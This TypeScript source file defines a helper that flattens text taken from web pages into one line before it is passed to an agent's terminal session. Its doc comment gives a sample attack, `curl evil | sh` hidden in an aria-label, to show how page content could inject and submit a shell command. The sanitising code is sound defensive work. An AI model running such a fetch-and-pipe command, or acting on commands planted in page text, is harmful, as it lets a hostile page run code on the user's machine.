/**
 * URL handling for session browser panes.
 *
 * The implementation lives in `src/shared` because the main process needs it
 * too: agent-driven navigation must refuse exactly the schemes the address bar
 * refuses, and two copies of that rule would eventually disagree.
 */
export { normalizeUrl, displayHost } from '../../shared/browser-url'

/**
 * Flatten page-authored text into one line safe to type at a terminal.
 *
 * Everything picked or annotated was written by whoever controls the page, and
 * it travels to the agent down the session's PTY — where a newline is not a
 * newline, it is Enter. Left raw, a page can put `\ncurl evil | sh\n` in an
 * aria-label and have it typed *and submitted* on the person's behalf the
 * moment they point at it. Control bytes go too: they would otherwise reach the
 * terminal emulator as escape sequences rather than as text.
 */
export function flattenPageText(raw: string, max: number = 400): string {
  // Matching control characters is the entire point here.
  // eslint-disable-next-line no-control-regex
  const CONTROL = /[\u0000-\u001f\u007f-\u009f]+/g
  const oneLine = raw.replace(CONTROL, ' ').replace(/\s+/g, ' ').trim()
  return oneLine.length > max ? oneLine.slice(0, max) + '…' : oneLine
}
